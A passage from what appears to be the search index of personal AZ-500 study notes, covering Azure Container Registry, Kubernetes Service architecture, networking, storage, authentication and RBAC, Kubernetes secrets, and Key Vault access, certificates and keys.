logging sidecars.</p> <p>Virtual network deployment: \u00a0Currently available for production workloads in a subset of Azure regions, this feature of Azure Container Instances enables deployment of container instances into an Azure virtual network. By deploying container instances into a subnet within your virtual network, they can communicate securely with other resources in the virtual network, including those that are on premises (through VPN gateway or ExpressRoute).</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#43-azure-container-registry-acr","title":"4.3. Azure Container Registry (ACR)","text":"<p>A container registry is a service that stores and distributes container images. Docker Hub is a public container registry that supports the open source community and serves as a general catalog of images. Azure Container Registry provides users with direct control of their images, with integrated authentication, geo-replication supporting global distribution and reliability for network-close deployments, virtual network and firewall configuration, tag locking, and many other enhanced features.</p> <p>In addition to Docker container images, Azure Container Registry supports related content artifacts including Open Container Initiative (OCI) image formats.</p> <p></p> <p>You log in to a registry using the Azure CLI or the standard docker login command. Azure Container Registry transfers container images over HTTPS, and supports TLS to secure client connections. Azure Container Registry requires all secure connections from servers and applications to use TLS 1.2. Enable TLS 1.2 by using any recent docker client (version 18.03.0 or later). You control access to a container registry using an Azure identity, a Microsoft Entra ID-backed service principal, or a provided admin account. Use role-based access control (RBAC) to assign users or systems fine-grained permissions to a registry.</p> <p>Container registries manage repositories, collections of container images or other artifacts with the same name, but different tags. For example, the following three images are in the \"acr-helloworld\" repository:</p> <ul> <li>acr-helloworld:latest</li> <li>acr-helloworld:v1</li> <li>acr-helloworld:v2</li> </ul> <p>A container image or other artifact within a registry is associated with one or more tags, has one or more layers, and is identified by a manifest. Understanding how these components relate to each other can help you manage your registry effectively.</p> <p>As with any IT environment, you should consistently monitor activity and user access to your container ecosystem to quickly identify any suspicious or malicious activity. The container monitoring solution in Log Analytics can help you view and manage your Docker and Windows container hosts in a single location.</p> <p>By using Log Analytics, you can:</p> <ul> <li>View detailed audit information that shows commands used with containers.</li> <li>Troubleshoot containers by viewing and searching centralized logs without having to remotely view Docker or Windows hosts.</li> <li>Find containers that may be noisy and consuming excess resources on a host.</li> <li>View centralized CPU, memory, storage, and network usage and performance information for containers.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#44-azure-container-registry-authentication","title":"4.4. Azure Container Registry authentication","text":"<p>Individual login with Microsoft Entra ID.- When working with your registry directly, such as pulling images to and pushing images from a development workstation, authenticate by using the az acr login command in the Azure CLI. When you log in with az acr login, the CLI uses the token created when you executed az login to seamlessly authenticate your session with your registry. To complete the authentication flow, Docker must be installed and running in your environment. az acr login uses the Docker client to set a Microsoft Entra token in the docker.config file. Once you've logged in this way, your credentials are cached, and subsequent docker commands in your session do not require a username or password.</p> <p>Service Principal.-  If you assign a service principal to your registry, your application or service can use it for headless authentication. Service principals allow role-based access to a registry, and you can assign multiple service principals to a registry. Multiple service principals allow you to define different access for different applications. The available roles for a container registry include:</p> <ul> <li>AcrPull: pull</li> <li>AcrPush: pull and push</li> <li>Owner: pull, push, and assign roles to other users</li> </ul> <p>Admin account.-  Each container registry includes an admin user account, which is disabled by default. You can enable the admin user and manage its credentials in the Azure portal, or by using the Azure CLI or other Azure tools. The admin account is provided with two passwords, both of which can be regenerated. Two passwords allow you to maintain connection to the registry by using one password while you regenerate the other. If the admin account is enabled, you can pass the username and either password to the docker login command when prompted for basic authentication to the registry.</p> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#45-azure-kubernetes-service-aks","title":"4.5. Azure Kubernetes Service (AKS)","text":"<p>As application development moves towards a container-based approach, the need to orchestrate and manage resources is important. Kubernetes is the leading platform that provides the ability to provide reliable scheduling of fault-tolerant application workloads. Azure Kubernetes Service (AKS) is a managed Kubernetes offering that further simplifies container-based application deployment and management.</p> <p>Azure Kubernetes Service (AKS) provides a managed Kubernetes service that reduces the complexity for deployment and core management tasks, including coordinating upgrades. The AKS control plane is managed by the Azure platform, and you only pay for the AKS nodes that run your applications. AKS is built on top of the open-source Azure Kubernetes Service Engine (aks-engine).</p> <p>Kubernetes cluster architecture: A Kubernetes cluster is divided into two components:</p> <ul> <li>Control plane\u00a0nodes provide the core Kubernetes services and orchestration of application workloads.</li> <li>Nodes\u00a0run your application workloads.</li> </ul> <p></p> <p>Features of Azure Kubernetes Service:</p> <ul> <li>Fully managed</li> <li>Public IP and FQDN (Private IP option)</li> <li>Accessed with RBAC or Microsoft Entra ID</li> <li>Deployment of containers</li> <li>Dynamic scale containers</li> <li>Automation of rolling updates and rollbacks of containers</li> <li>Management of storage, network traffic, and sensitive information</li> </ul> <p>Kubernetes cluster architecture is a set of design recommendations for deploying your containers in a secure and managed configuration. When you create an AKS cluster, a cluster master is automatically created and configured. This cluster master is provided as a managed Azure resource abstracted from the user. There is no cost for the cluster master, only the nodes that are part of the AKS cluster. The cluster master includes the following core Kubernetes components:</p> <ul> <li>kube-apiserver\u00a0- The API server is how the underlying Kubernetes APIs are exposed. This component provides the interaction for management tools, such as\u00a0<code>kubectl</code>\u00a0or the Kubernetes dashboard. By default, the Kubernetes API server uses a public IP address and a fully qualified domain name (FQDN). You can control access to the API server using Kubernetes role-based access controls and Microsoft Entra ID.</li> <li>etcd\u00a0- To maintain the state of your Kubernetes cluster and configuration, the highly available\u00a0etcd\u00a0is a key value store within Kubernetes.</li> <li>kube-scheduler\u00a0- When you create or scale applications, the Scheduler determines what nodes can run the workload and starts them.</li> <li>kube-controller-manager\u00a0- The Controller Manager oversees a number of smaller Controllers that perform actions such as replicating pods and handling node operations.</li> </ul> <p>AKS provides a single-tenant cluster master, with a dedicated API server, Scheduler, etc. You define the number and size of the nodes, and the Azure platform configures the secure communication between the cluster master and nodes. Interaction with the cluster master occurs through Kubernetes APIs, such as\u00a0<code>kubectl</code>\u00a0or the Kubernetes dashboard.</p> <p>This managed cluster master means that you do not need to configure components like a highly available store, but it also means that you cannot access the cluster master directly. Upgrades to Kubernetes are orchestrated through the Azure CLI or Azure portal, which upgrades the cluster master and then the nodes. To troubleshoot possible issues, you can review the cluster master logs through Azure Log Analytics.</p> <p>If you need to configure the cluster master in a particular way or need direct access to them, you can deploy your own Kubernetes cluster using\u00a0<code>aks-engine</code>.</p> <p>Nodes and node pools: To run your applications and supporting services, you need a Kubernetes node. An AKS cluster has one or more nodes, which is an Azure virtual machine (VM) that runs the Kubernetes node components and container runtime:</p> <ul> <li>The kubelet is the Kubernetes agent that processes the orchestration requests from the control plane and scheduling of running the requested containers.</li> <li>Virtual networking is handled by the kube-proxy on each node. The proxy routes network traffic and manages IP addressing for services and pods.</li> <li>The\u00a0container runtime\u00a0is the component that allows containerized applications to run and interact with additional resources such as the virtual network and storage. In AKS, Moby is used as the container runtime.</li> </ul> <p>The Azure VM size for your nodes defines how many CPUs, how much memory, and the size and type of storage available (such as high-performance SSD or regular HDD). If you anticipate a need for applications that require large amounts of CPU and memory or high-performance storage, plan the node size accordingly. You can also scale out the number of nodes in your AKS cluster to meet demand.</p> <p>In AKS, the VM image for the nodes in your cluster is currently based on Ubuntu Linux or Windows Server 2019. When you create an AKS cluster or scale out the number of nodes, the Azure platform creates the requested number of VMs and configures them. There's no manual configuration for you to perform. Agent nodes are billed as standard virtual machines, so any discounts you have on the VM size you're using (including Azure reservations) are automatically applied. If you need to use a different host OS, container runtime, or include custom packages, you can deploy your own Kubernetes cluster using aks-engine. The upstream aks-engine releases features and provides configuration options before they are officially supported in AKS clusters. For example, if you wish to use a container runtime other than Moby, you can use aks-engine to configure and deploy a Kubernetes cluster that meets your current needs.</p> <p>Some basic concepts</p> <ul> <li>Pools: Group of nodes with identical configuration.</li> <li>Node: Individual VM running containerized applications.</li> <li>Pods: Single instance of an application. A pod can contain multiple containers.</li> <li>Deployment: One or more identical pods managed by Kubernetes.</li> <li>Manifest: YAML file describing a deployment.</li> </ul> <p>AKS nodes are Azure virtual machines that you manage and maintain. Linux nodes run an optimized Ubuntu distribution using the Moby container runtime. Windows Server nodes run an optimized Windows Server 2019 release and also use the Moby container runtime. When an AKS cluster is created or scaled up, the nodes are automatically deployed with the latest OS security updates and configurations.</p> <ul> <li>Linux: The Azure platform automatically applies OS security patches to Linux nodes on a nightly basis. If a Linux OS security update requires a host reboot, that reboot is not automatically performed. You can manually reboot the Linux nodes, or a common approach is to use Kured, an open-source reboot daemon for Kubernetes. Kured runs as a DaemonSet and monitors each node for the presence of a file indicating that a reboot is required. Reboots are managed across the cluster using the same cordon and drain process as a cluster upgrade.</li> <li>Windows: Windows Update does not automatically run and apply the latest updates. On a regular schedule around the Windows Update release cycle and your own validation process, you should perform an upgrade on the Windows Server node pool(s) in your AKS cluster. This upgrade process creates nodes that run the latest Windows Server image and patches, then removes the older nodes. Nodes are deployed into a private virtual network subnet, with no public IP addresses assigned. For troubleshooting and management purposes, SSH is enabled by default. This SSH access is only available using the internal IP address.</li> </ul> <p>To provide storage, the nodes use Azure Managed Disks. For most VM node sizes, these are Premium disks backed by high-performance SSDs. The data stored on managed disks is automatically encrypted at rest within the Azure platform. To improve redundancy, these disks are also securely replicated within the Azure datacenter.</p> <p>Kubernetes environments, in AKS or elsewhere, currently aren't completely safe for hostile multi-tenant usage. Additional security features such as Pod Security Policies or more fine-grained role-based access controls (RBAC) for nodes make exploits more difficult. However, for true security when running hostile multi-tenant workloads, a hypervisor is the only level of security that you should trust. The security domain for Kubernetes becomes the entire cluster, not an individual node. For these types of hostile multi-tenant workloads, you should use physically isolated clusters.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#46-azure-kubernetes-service-networking","title":"4.6. Azure Kubernetes Service networking","text":"<p>To allow access to your applications, or for application components to communicate with each other, Kubernetes provides an abstraction layer to virtual networking. Kubernetes nodes are connected to a virtual network, and can provide inbound and outbound connectivity for pods. The kube-proxy component runs on each node to provide these network features.</p> <p>In Kubernetes, Services logically group pods to allow for direct access via an IP address or DNS name and on a specific port. You can also distribute traffic using a load balancer. More complex routing of application traffic can also be achieved with Ingress Controllers. Security and filtering of the network traffic for pods is possible with Kubernetes network policies.</p> <p>The Azure platform also helps to simplify virtual networking for AKS clusters. When you create a Kubernetes load balancer, the underlying Azure load balancer resource is created and configured. As you open network ports to pods, the corresponding Azure network security group rules are configured. For HTTP application routing, Azure can also configure external DNS as new ingress routes are configured. In sum up:</p> <ul> <li>Cluster IP\u00a0- Creates an internal IP address for use within the AKS cluster. Good for internal-only applications that support other workloads within the cluster.</li> <li>NodePort\u00a0- Creates a port mapping on the underlying node that allows the application to be accessed directly with the node IP address and port.</li> <li>LoadBalancer\u00a0- Creates an Azure load balancer resource, configures an external IP address, and connects the requested pods to the load balancer backend pool. To allow customers' traffic to reach the application, load balancing rules are created on the desired ports.</li> <li>ExternalName\u00a0- Creates a specific DNS entry for easier application access.</li> </ul> <p>The\u00a0Network Policy\u00a0feature in Kubernetes lets you define rules for ingress and egress traffic between pods in a cluster.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#47-azure-kubernetes-service-storage","title":"4.7. Azure Kubernetes Service storage","text":"<p>Applications that run in Azure Kubernetes Service (AKS) may need to store and retrieve data.</p> <p>A volume represents a way to store, retrieve, and persist data across pods and through the application lifecycle. Traditional volumes to store and retrieve data are created as Kubernetes resources backed by Azure Storage. You can manually create these data volumes to be assigned to pods directly, or have Kubernetes automatically create them. These data volumes can use Azure Disks or Azure Files:</p> <ul> <li>Azure Disks\u00a0can be used to create a Kubernetes DataDisk resource. Disks can use Azure Premium storage, backed by high-performance SSDs, or Azure Standard storage, backed by regular HDDs. For most production and development workloads, use Premium storage. Azure Disks are mounted as ReadWriteOnce, so are only available to a single pod. For storage volumes that can be accessed by multiple pods simultaneously, use Azure Files.</li> <li>Azure Files\u00a0can be used to mount an SMB 3.0 share backed by an Azure Storage account to pods. Files let you share data across multiple nodes and pods. Files can use Azure Standard storage backed by regular HDDs, or Azure Premium storage, backed by high-performance SSDs.</li> </ul> <p>Volumes that are defined and created as part of the pod lifecycle only exist until the pod is deleted. Pods often expect their storage to remain if a pod is rescheduled on a different host during a maintenance event, especially in StatefulSets. A persistent volume (PV) is a storage resource created and managed by the Kubernetes API that can exist beyond the lifetime of an individual pod.</p> <p>A\u00a0Persistent Volume\u00a0can be\u00a0statically\u00a0created by a cluster administrator, or\u00a0dynamically\u00a0created by the Kubernetes API server. If a pod is scheduled and requests storage that is not currently available, Kubernetes can create the underlying Azure Disk or Files storage and attach it to the pod. Dynamic provisioning uses a\u00a0StorageClass\u00a0to identify what type of Azure storage needs to be created</p> <p>To define different tiers of storage, such as Premium and Standard, you can create a Storage Class. The StorageClass also defines the reclaimPolicy. This reclaimPolicy controls the behavior of the underlying Azure storage resource when the pod is deleted and the persistent volume may no longer be required. The underlying storage resource can be deleted, or retained for use with a future pod. In AKS, two initial StorageClasses are created:</p> <ul> <li>default\u00a0- Uses Azure Standard storage to create a Managed Disk. The reclaim policy indicates that the underlying Azure Disk is deleted when the persistent volume that used it is deleted.</li> <li>managed-premium\u00a0- Uses Azure Premium storage to create Managed Disk. The reclaim policy again indicates that the underlying Azure Disk is deleted when the persistent volume that used it is deleted.</li> </ul> <p>If no StorageClass is specified for a persistent volume, the default StorageClass is used.</p> <p>A PersistentVolumeClaim requests either Disk or File storage of a particular StorageClass, access mode, and size. The Kubernetes API server can dynamically provision the underlying storage resource in Azure if there is no existing resource to fulfill the claim based on the defined StorageClass. The pod definition includes the volume mount once the volume has been connected to the pod. A PersistentVolume is bound to a PersistentVolumeClaim once an available storage resource has been assigned to the pod requesting it. There is a 1:1 mapping of persistent volumes to claims.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#48-secure-authentication-to-azure-kubernetes-service-with-active-directory","title":"4.8. Secure authentication to Azure Kubernetes Service with Active Directory","text":"<p>There are basically two mechanism to secure authentication to Azure Kebernetes Service:</p> <ul> <li>Kubernetes service accounts: One of the primary user types in Kubernetes is a service account. A service account exists and is managed by, the Kubernetes API. The credentials for service accounts are stored as Kubernetes secrets, which allows them to be used by authorized pods to communicate with the API Server. Most API requests provide an authentication token for a service account or a normal user account. Normal user accounts allow more traditional access for human administrators or developers, not just services and processes. Kubernetes itself doesn't provide an identity management solution where regular user accounts and passwords are stored. Instead, external identity solutions can be integrated into Kubernetes. For AKS clusters, this integrated identity solution is Microsoft Entra ID.</li> <li>Microsoft Entra integration: The security of AKS clusters can be enhanced with the integration of Microsoft Entra ID. With Microsoft Entra ID, you can integrate on-premises identities into AKS clusters to provide a single source for account management and security. With Microsoft Entra integrated AKS clusters, you can grant users or groups access to Kubernetes resources within a namespace or across the cluster. To obtain a Kubectl configuration context, a user can run the az aks get-credentials command. When a user then interacts with the AKS cluster with kubectl, they are prompted to sign in with their Microsoft Entra credentials. This approach provides a single source for user account management and password credentials. The user can only access the resources as defined by the cluster administrator.</li> </ul> <p>Microsoft Entra authentication in AKS clusters uses OpenID Connect, an identity layer built on top of the OAuth 2.0 protocol. OAuth 2.0 defines mechanisms to obtain and use access tokens to access protected resources, and OpenID Connect implements authentication as an extension to the OAuth 2.0 authorization process.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#49-access-to-azure-kubernetes-service-using-azure-role-based-access-controls","title":"4.9. Access to Azure Kubernetes Service using Azure role-based access controls","text":"<p>Azure role-based access control (RBAC) is an authorization system built on\u00a0Azure Resource Manager\u00a0that provides fine-grained access management of Azure resources.</p> RBAC system Description Kubernetes RBAC Designed to work on Kubernetes resources within your AKS cluster. Azure RBAC Designed to work on resources within your Azure subscription. <p>There are two levels of access needed to fully operate an AKS cluster:</p> <ul> <li>Access the AKS resource in your Azure subscription.<ul> <li>Control scaling or upgrading your cluster using the AKS APIs.</li> <li>Pull your\u00a0<code>kubeconfig</code>.</li> </ul> </li> <li>Access to the Kubernetes API. This access is controlled by either:<ul> <li>Kubernetes RBAC\u00a0(traditionally).</li> <li>Integrating Azure RBAC with AKS for Kubernetes authorization.</li> </ul> </li> <li></li> </ul> <p>Before you assign permissions to users with Kubernetes RBAC, you first define those permissions as a Role. Kubernetes roles grant permissions. There is no concept of a deny permission.</p> <p>Roles are used to grant permissions within a namespace. If you need to grant permissions across the entire cluster, or to cluster resources outside a given namespace, you can instead use ClusterRoles.</p> <p>A ClusterRole works in the same way to grant permissions to resources, but can be applied to resources across the entire cluster, not a specific namespace.</p> <p>Once roles are defined to grant permissions to resources, you assign those Kubernetes RBAC permissions with a RoleBinding. If your AKS cluster integrates with Microsoft Entra ID, bindings are how those Microsoft Entra users are granted permissions to perform actions within the cluster. </p> <p>A ClusterRoleBinding works in the same way to bind roles to users, but can be applied to resources across the entire cluster, not a specific namespace. This approach lets you grant administrators or support engineers access to all resources in the AKS cluster.</p> <p>Secrets at Linux: A Kubernetes Secret is used to inject sensitive data into pods, such as access credentials or keys. You first create a Secret using the Kubernetes API. When you define your pod or deployment, a specific Secret can be requested. Secrets are only provided to nodes that have a scheduled pod that requires it, and the Secret is stored in tmpfs, not written to disk. When the last pod on a node that requires a Secret is deleted, the Secret is deleted from the node's tmpfs. Secrets are stored within a given namespace and can only be accessed by pods within the same namespace. The use of Secrets reduces the sensitive information that is defined in the pod or service YAML manifest. Instead, you request the Secret stored in Kubernetes API Server as part of your YAML manifest. This approach only provides the specific pod access to the Secret. Please note: the raw secret manifest files contains the secret data in base64 format. Therefore, this file should be treated as sensitive information, and never committed to source control.</p> <p>Secrets in Windows containers: Secrets are written in clear text on the node\u2019s volume (as compared to tmpfs/in-memory on linux). This means customers have to do two things:</p> <ul> <li>Use file ACLs to secure the secrets file location</li> <li>Use volume-level encryption using BitLocker</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/","title":"III. Data and applications","text":"Sources of this notes <ul> <li>The Microsoft e-learn platform.</li> <li>Book:  \"Microsoft Certified - MCA Microsoft Certified Associate Azure Security Engineer Study Guide: Exam AZ-500. </li> <li>Udemy course:  AZ-500 Microsoft Azure Security Technologies Exam Prep.</li> <li>Udemy course: Azure Security: AZ-500 (updated July 2023)</li> </ul> Summary: AZ-500 Microsoft Azure Security Engineer Certification <ul> <li>About the certificate</li> <li>I. Manage Identity and Access</li> <li>II. Platform protection</li> <li>III. Data and applications</li> <li>IV. Security operations</li> <li>AZ-500 and more: keep learning</li> </ul> <p>Cheatsheets: Azure-CLI | Azure PowerShell </p> <p>100 questions you should pass for the AZ-500 certificate </p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#1-azure-key-vault","title":"1.  Azure Key Vault","text":"<p>Azure Key Vault helps safeguard cryptographic keys and secrets that cloud applications and services use. Key Vault streamlines the key management process and enables you to maintain control of keys that access and encrypt your data.  Developers can create keys for development and testing in minutes, and then migrate them to production keys. Security administrators can grant (and revoke) permission to keys, as needed. You can use Key Vault to create multiple secure containers, called vaults. Vaults help reduce the chances of accidental loss of security information by centralizing application secrets storage. Key vaults also control and log the access to anything stored in them.</p> <p>Azure Key Vault helps address the following issues:</p> <ul> <li>Secrets management. You can use Azure Key Vault to securely store and tightly control access to tokens, passwords, certificates, API keys, and other secrets.</li> <li>Key management. You use Azure Key Vault as a key management solution, making it easier to create and control the encryption keys used to encrypt your data.</li> <li>Certificate management. Azure Key Vault is also a service that lets you easily provision, manage, and deploy public and private SSL/TLS certificates for use with Azure and your internal connected resources.</li> <li>Store secrets backed by hardware security modules (HSMs). The secrets and keys can be protected either by software, or FIPS 140-2 Level 2 validates HSMs.</li> </ul> <p>Key Vault is not intended as storage for user passwords.</p> <p>Access to a key vault is controlled through two separate interfaces: management plane, and data plane. The management plane and data plane access controls work independently. Use RBAC to control what users have access to. For example, if you want to grant an application access to use keys in a key vault, you only need to grant data plane access permissions by using key vault access policies, and no management plane access is needed for this application. Conversely, if you want a user to be able to read vault properties and tags but not have any access to keys, secrets, or certificates, you can grant this user read access by using RBAC, and no access to the data plane is required. </p> <p>If a user has contributor permissions (RBAC) to a key vault management plane, they can grant themselves access to the data plane by setting a key vault access policy. We recommend that you tightly control who has contributor access to your key vaults, to ensure that only authorized persons can access and manage your key vaults, keys, secrets, and certificates.</p> <p>Azure Resource Manager can securely deploy certificates stored in Azure Key Vault to Azure VMs when the VMs are deployed. By setting appropriate access policies for the key vault, you also control who gets access to your certificate. Another benefit is that you manage all your certificates in one place in Azure Key Vault.</p> <p>Deletion of key vaults or key vault objects can be either inadvertent or malicious. Enable the soft delete and purge protection features of Key Vault, particularly for keys that are used to encrypt data at rest. Deletion of these keys is equivalent to data loss, so you can recover deleted vaults and vault objects if needed. Practice Key Vault recovery operations on a regular basis.</p> <p>Azure Key Vault is offered in two service tiers\u2014standard and premium. The main difference between Standard and Premium is that Premium supports HSM-protected keys.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#11-configure-key-vault-access","title":"1.1. Configure Key Vault access","text":"<p>Access to a key vault is controlled through two interfaces: the management plane, and the data plane. The management plane is where you manage Key Vault itself. Operations in this plane include creating and deleting key vaults, retrieving Key Vault properties, and updating access policies. The data plane is where you work with the data stored in a key vault. You can add, delete, and modify keys, secrets, and certificates from here.</p> <p></p> <p>To access a key vault in either plane, all callers (users or applications) must have proper authentication and authorization. Authentication establishes the identity of the caller. Authorization determines which operations the caller can execute.</p> <p>Both planes use Microsoft Entra ID for authentication. For authorization, the management plane uses RBAC, and the data plane can use either\u00a0newly added RBAC\u00a0or a Key Vault access policy.</p> <p>When you create a key vault in an Azure subscription, its automatically associated with the Microsoft Entra tenant of the subscription. Applications can access Key Vault in two ways:</p> <ul> <li>User plus application access. The application accesses Key Vault on behalf of a signed-in user. Examples of this type of access include Azure PowerShell and the Azure portal. User access is granted in two ways. They can either access Key Vault from any application, or they must use a specific application (referred to as compound identity).</li> <li>Application-only access. The application runs as a daemon service or background job. The application identity is granted access to the key vault.</li> </ul> <p>For both types of access, the application authenticates with Microsoft Entra ID. The model of a single mechanism for authentication to both planes has several benefits:</p> <ul> <li>Organizations can centrally control access to all key vaults in their organization.</li> <li>If a user leaves, they instantly lose access to all key vaults in the organization.</li> <li>Organizations can customize authentication by using the options in Microsoft Entra ID, such as to enable multifactor authentication for added security.</li> </ul> Role Management plane permissions Data plane permissions Security team Key Vault Contributor Keys: backup, create, delete, get, import, list, restore. Secrets: all operations Developers and operators Key Vault deploy permission\u00a0Note: This permission allows deployed VMs to fetch secrets from a key vault. None Auditors None Keys: list Secrets: list.\u00a0Note: This permission enables auditors to inspect attributes (tags, activation dates, expiration dates) for keys and secrets not emitted in the logs. Application None Keys: sign Secrets: get <p>The three team roles need access to other resources along with Key Vault permissions. To deploy VMs (or the Web Apps feature of Azure App Service), developers and operators need Contributor access to those resource types. Auditors need read access to the Storage account where the Key Vault logs are stored.</p> <p>Some built-in RBAC in Azure:</p> Built-in role Description ID Key Vault Administrator Perform all data plane operations on a key vault and all objects in it, including certificates, keys, and secrets. Cannot manage key vault resources or manage role assignments. Only works for key vaults that use the 'Azure role-based access control' permission model. 00482a5a-887f-4fb3-b363-3b7fe8e74483 Key Vault Certificates Officer Perform any action on the certificates of a key vault, except manage permissions. Only works for key vaults that use the 'Azure role-based access control' permission model. a4417e6f-fecd-4de8-b567-7b0420556985 Key Vault Crypto Officer Perform any action on the keys of a key vault, except manage permissions. Only works for key vaults that use the 'Azure role-based access control' permission model. 14b46e9e-c2b7-41b4-b07b-48a6ebf60603 Key Vault Crypto Service Encryption User Read metadata of keys and perform wrap/unwrap operations. Only works for key vaults that use the 'Azure role-based access control' permission model. e147488a-f6f5-4113-8e2d-b22465e65bf6 Key Vault Crypto User Perform cryptographic operations using keys. Only works for key vaults that use the 'Azure role-based access control' permission model. 12338af0-0e69-4776-bea7-57ae8d297424 Key Vault Reader Read metadata of key vaults and its certificates, keys, and secrets. Cannot read sensitive values such as secret contents or key material. Only works for key vaults that use the 'Azure role-based access control' permission model. 21090545-7ca7-4776-b22c-e363652d74d2 Key Vault Secrets Officer Perform any action on the secrets of a key vault, except manage permissions. Only works for key vaults that use the 'Azure role-based access control' permission model. b86a8fe4-44ce-4948-aee5-eccb2c155cd7 Key Vault Secrets User Read secret contents including secret portion of a certificate with private key. Only works for key vaults that use the 'Azure role-based access control' permission model. 4633458b-17de-408a-b874-0445c86b69e6","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#12-deploy-and-manage-key-vault-certificates","title":"1.2. Deploy and manage Key Vault certificates","text":"<p>Key Vault certificates support provides for management of your x509 certificates and enables:</p> <ul> <li>A certificate owner to create a certificate through a Key Vault creation process or through the import of an existing certificate. Includes both self-signed and CA-generated certificates.</li> <li>A Key Vault certificate owner to implement secure storage and management of X509 certificates without interaction with private key material.</li> <li>A certificate owner to create a policy that directs Key Vault to manage the life-cycle of a certificate.</li> <li>Certificate owners to provide contact information for notification about lifecycle events of expiration and renewal of certificate.</li> <li>Automatic renewal with selected issuers - Key Vault partner X509 certificate providers and CAs.</li> </ul> <p>When a Key Vault certificate is created, an addressable key and secret are also created with the same name. The Key Vault key allows key operations and the Key Vault secret allows retrieval of the certificate value as a secret. A Key Vault certificate also contains public x509 certificate metadata.</p> <p>When a Key Vault certificate is created, it can be retrieved from the addressable secret with the private key in either PFX or PEM format. However, the policy used to create the certificate must indicate that the key is exportable. If the policy indicates non-exportable, then the private key isn't a part of the value when retrieved as a secret.</p> <p>The addressable key becomes more relevant with non-exportable Key Vault certificates. The addressable Key Vault key\u2019s operations are mapped from the\u00a0<code>keyusage</code>\u00a0field of the Key Vault certificate policy used to create the Key Vault certificate. If a Key Vault certificate expires, it\u2019s addressable key and secret become inoperable.</p> <p>Two types of key are supported \u2013 RSA or RSA HSM with certificates. Exportable is only allowed with RSA, and is not supported by RSA HSM.</p> <p>Certificate policy</p> <p>A certificate policy contains information on how to create and manage the Key Vault certificate lifecycle. When a certificate with private key is imported into the Key Vault, a default policy is created by reading the x509 certificate. When a Key Vault certificate is created from scratch, a policy needs to be supplied. This policy specifies how to create the Key Vault certificate version, or the next Key Vault certificate version. At a high level, a certificate policy contains the following information:</p> <ul> <li>X509 certificate properties. Contains subject name, subject alternate names, and other properties used to create an x509 certificate request.</li> <li>Key Properties. Contains key type, key length, exportable, and reuse key fields. These fields instruct key vault on how to generate a key.</li> <li>Secret properties. Contains secret properties such as content type of addressable secret to generate the secret value, for retrieving certificate as a secret.</li> <li>Lifetime Actions. Contains lifetime actions for the Key Vault certificate. Each lifetime action contains:<ul> <li>Trigger, which specifies via days before expiry or lifetime span percentage.</li> <li>Action, which specifies the action type: emailContacts, or autoRenew.</li> </ul> </li> <li>Issuer: Contains the parameters about the certificate issuer to use to issue x509 certificates.</li> <li>Policy attributes: Contains attributes associated with the policy.</li> </ul> <p>Certificate Issuer</p> <p>Before you can create a certificate issuer in a Key Vault, the following two prerequisite steps must be completed successfully:</p> <ol> <li>Onboard to CA providers: An organization administrator must onboard their company with at least one CA provider.</li> <li>Admin creates requester credentials for Key Vault to enroll (and renew) SSL certificates: Provides the configuration to be used to create an issuer object of the provider in the key vault.</li> </ol> <p>Certificate contacts</p> <p>Certificate contacts contain contact information to send notifications triggered by certificate lifetime events. The contacts information is shared by all the certificates in the key vault. If a certificate's policy is set to auto renewal, then a notification is sent for the following events:</p> <ul> <li>Before certificate renewal</li> <li>After certificate renewal, and stating if the certificate was successfully renewed, or if there was an error, requiring manual renewal of the certificate</li> <li>When it\u2019s time to renew a certificate for a certificate policy that is set to manually renew (email only)</li> </ul> <p>Certificate access control</p> <p>The Key Vault that contains certificates manages access control for those same certificates. he access control policy for certificates is distinct from the access control policies for keys and secrets in the same Key Vault. Users might create one or more vaults to hold certificates, to maintain scenario appropriate segmentation and management of certificates.</p> <ul> <li>Permissions for certificate management operations:<ul> <li>get: Get the current certificate version, or any version of a certificate.</li> <li>list: List the current certificates, or versions of a certificate.</li> <li>update: Update a certificate.</li> <li>create: Create a Key Vault certificate.</li> <li>import: Import certificate material into a Key Vault certificate.</li> <li>delete: Delete a certificate, its policy, and all of its versions.</li> <li>recover: Recover a deleted certificate.</li> <li>backup: Back up a certificate in a key vault.</li> <li>restore: Restore a backed-up certificate to a key vault.</li> <li><code>managecontacts</code>: Manage Key Vault certificate contacts.</li> <li><code>manageissuers</code>: Manage Key Vault certificate authorities/issuers.</li> <li><code>getissuers</code>: Get a certificate's authorities/issuers.</li> <li><code>listissuers</code>: List a certificate's authorities/issuers.</li> <li><code>setissuers</code>: Create or update a Key Vault certificate's authorities/issuers.</li> <li><code>deleteissuers</code>: Delete a Key Vault certificate's authorities/issuers.</li> </ul> </li> <li>Permissions for privileged operations:<ul> <li>purge: Purge (permanently delete) a deleted certificate.</li> </ul> </li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#13-create-key-vault-keys","title":"1.3. Create Key Vault keys","text":"<p>Cryptographic keys in Key Vault are represented as\u00a0JSON Web Key (JWK)\u00a0objects. There are two types of keys, depending on how they were created.</p> <ul> <li>Soft keys: A key processed in software by Key Vault, but is encrypted at rest using a system key that is in a\u00a0Hardware Security Module (HSM). Clients may import an existing RSA or EC (Elliptic Curve) key, or request that Key Vault generates one.</li> <li>Hard keys: A key processed in an HSM (Hardware Security Module). These keys are protected in one of the Key Vault HSM Security Worlds (there's one Security World per geography to maintain isolation). Clients may import an RSA or EC key, in soft form or by exporting from a compatible HSM device. Clients may also request Key Vault to generate a key.</li> </ul> <p>Key operations. - Key Vault supports many operations on key objects. Here are a few:</p> <ul> <li>Create: Allows a client to create a key in Key Vault. The value of the key is generated by 